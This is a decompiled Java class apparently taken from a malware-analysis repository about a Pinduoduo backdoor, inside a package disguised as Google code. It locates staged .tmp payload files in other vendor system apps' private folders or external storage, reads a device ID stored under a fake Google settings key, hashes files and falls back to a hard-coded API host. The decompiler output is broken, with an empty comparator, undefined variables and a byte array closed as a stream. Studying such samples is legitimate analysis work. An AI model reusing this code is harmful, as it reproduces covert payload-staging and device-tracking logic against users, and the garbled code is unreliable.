package com.google.android.sd.biz_dynamic_dex.base;

import android.content.Context;
import android.os.Environment;
import android.provider.Settings;
import android.text.TextUtils;
import com.google.android.sd.utils.BizUtils;
import java.io.Closeable;
import java.io.File;
import java.io.FileFilter;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Comparator;
import java.util.Locale;

public final class c {
  private static final Comparator<File> a = new Comparator<File>() {
    
    };
  
  private static File a(Context paramContext, File paramFile, String paramString) {
    if (paramFile != null) {
      File file1 = a("temp", paramFile);
      if (a(file1))
        return file1; 
      paramFile = a(paramString, paramFile);
      if (a(paramFile))
        return paramFile; 
    } 
    paramFile = a("temp", paramContext.getFilesDir());
    if (a(paramFile))
      return paramFile; 
    File file = a(paramString, paramContext.getFilesDir());
    return a(file) ? file : null;
  }
  
  public static File a(Context paramContext, String paramString) {
    boolean bool;
    String str = paramContext.getPackageName();
    if ("com.heytap.pictorial".equalsIgnoreCase(str) || "com.coloros.pictorial".equalsIgnoreCase(str)) {
      bool = true;
    } else {
      bool = false;
    } 
    if (bool || "com.coloros.speechassist".equalsIgnoreCase(paramContext.getPackageName())) {
      StringBuilder stringBuilder = new StringBuilder("/data/data/");
      stringBuilder.append(paramContext.getPackageName());
      stringBuilder.append("/app_kernel/share/");
      File file = new File(stringBuilder.toString());
      return a(paramContext, file, paramString);
    } 
    str = null;
    return a(paramContext, (File)str, paramString);
  }
  
  private static File a(String paramString, File paramFile) {
    if (a.a) {
      paramFile = Environment.getExternalStorageDirectory();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(paramString);
      stringBuilder.append(".tmp");
      return new File(paramFile, stringBuilder.toString());
    } 
    if (paramFile == null)
      return null; 
    if (TextUtils.isEmpty(paramString))
      return null; 
    File[] arrayOfFile = paramFile.listFiles(new FileFilter(paramString) {
          public final boolean accept(File param1File) {
            String str = param1File.getName();
            return (param1File.exists() && param1File.isFile() && !TextUtils.isEmpty(str) && str.startsWith(this.a) && str.endsWith(".tmp"));
          }
        });
    if (arrayOfFile != null && arrayOfFile.length > 0) {
      if (arrayOfFile.length > 1)
        Arrays.sort(arrayOfFile, a); 
      return arrayOfFile[0];
    } 
    return null;
  }
  
  public static String a() {
    try {
      String str = BizUtils.getVersion();
      boolean bool = TextUtils.equals(str, "0.7.2");
      byte b = -1;
      int i = 0;
      if (bool) {
        i = 0;
      } else if (TextUtils.isEmpty(str) && !TextUtils.isEmpty("0.7.2")) {
        i = b;
      } else {
        if (TextUtils.isEmpty(str) || !TextUtils.isEmpty("0.7.2")) {
          String[] arrayOfString1 = str.split("\\.");
          String[] arrayOfString2 = "0.7.2".split("\\.");
          while (true) {
            if (i < arrayOfString1.length && i < arrayOfString2.length) {
              int j = Integer.parseInt(arrayOfString1[i]);
              int k = Integer.parseInt(arrayOfString2[i]);
              if (j < k) {
                i = b;
              } else {
                if (j <= k) {
                  i++;
                  continue;
                } 
                i = 1;
              } 
            } else {
              i = Integer.compare(arrayOfString1.length, arrayOfString2.length);
            } 
            if (i >= 0)
              return BizUtils.getApiHost(); 
          } 
        } 
        i = 1;
      } 
      if (i >= 0)
        return BizUtils.getApiHost(); 
    } catch (Exception exception) {}
    return "https://public.144dns.com";
  }
  
  public static String a(Context paramContext) {
    String str = b(paramContext);
    return (!TextUtils.isEmpty(str) && !"null".equalsIgnoreCase(str)) ? str : c(paramContext);
  }
  
  private static String a(FileInputStream paramFileInputStream) {
    try {
      MessageDigest messageDigest = MessageDigest.getInstance("MD5");
      byte[] arrayOfByte = new byte[1024];
      while (true) {
        int i = paramFileInputStream.read(arrayOfByte);
        if (i > 0) {
          messageDigest.update(arrayOfByte, 0, i);
          continue;
        } 
        String str2 = b(messageDigest.digest());
        String str1 = str2;
        if (str2 != null)
          str1 = str2.toLowerCase(Locale.ROOT); 
        return str1;
      } 
    } catch (Exception exception) {
      return "";
    } finally {
      a(paramFileInputStream);
    } 
  }
  
  public static String a(String paramString) {
    return TextUtils.isEmpty(paramString) ? "" : b(new File(paramString));
  }
  
  private static String a(byte[] paramArrayOfbyte) {
    try {
      MessageDigest messageDigest = MessageDigest.getInstance("MD5");
      messageDigest.update(paramArrayOfbyte);
      String str2 = b(messageDigest.digest());
      String str1 = str2;
      if (str2 != null)
        str1 = str2.toLowerCase(Locale.ROOT); 
      return str1;
    } catch (Exception exception) {
      return "";
    } 
  }
  
  private static void a(Closeable paramCloseable) {
    if (paramCloseable != null)
      try {
        paramCloseable.close();
        return;
      } catch (Exception exception) {
        return;
      }  
  }
  
  private static boolean a(File paramFile) {
    return (paramFile != null && paramFile.exists() && paramFile.isFile() && paramFile.length() > 0L);
  }
  
  private static String b(Context paramContext) {
    try {
      String str = Settings.Global.getString(paramContext.getContentResolver(), "com.google.android.sd.sid");
      return bool ? "" : str;
    } finally {
      paramContext = null;
    } 
  }
  
  private static String b(File paramFile) {
    if (!paramFile.exists())
      return ""; 
    try {
      String str = a(new FileInputStream(paramFile));
      boolean bool = TextUtils.isEmpty(str);
      return !bool ? str : "";
    } catch (Exception exception) {
      return "";
    } 
  }
  
  public static String b(String paramString) {
    return a(paramString.getBytes());
  }
  
  private static String b(byte[] paramArrayOfbyte) {
    if (paramArrayOfbyte == null || paramArrayOfbyte.length == 0)
      return null; 
    StringBuilder stringBuilder = new StringBuilder();
    int j = paramArrayOfbyte.length;
    for (int i = 0; i < j; i++) {
      String str = Integer.toHexString(paramArrayOfbyte[i] & 0xFF);
      if (str.length() < 2)
        stringBuilder.append(0); 
      stringBuilder.append(str);
    } 
    return stringBuilder.toString();
  }
  
  public static void b() {}
  
  private static String c(Context paramContext) {
    File file = new File(paramContext.getFilesDir(), "sid.dat");
    if (file.exists()) {
      byte[] arrayOfByte1;
      if (!file.isFile())
        return ""; 
      byte[] arrayOfByte2 = null;
      try {
        FileInputStream fileInputStream = new FileInputStream(file);
      } finally {
        file = null;
      } 
      if (arrayOfByte1 != null)
        try {
          arrayOfByte1.close();
          return "";
        } catch (IOException iOException) {
          return "";
        }  
    } 
    return "";
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */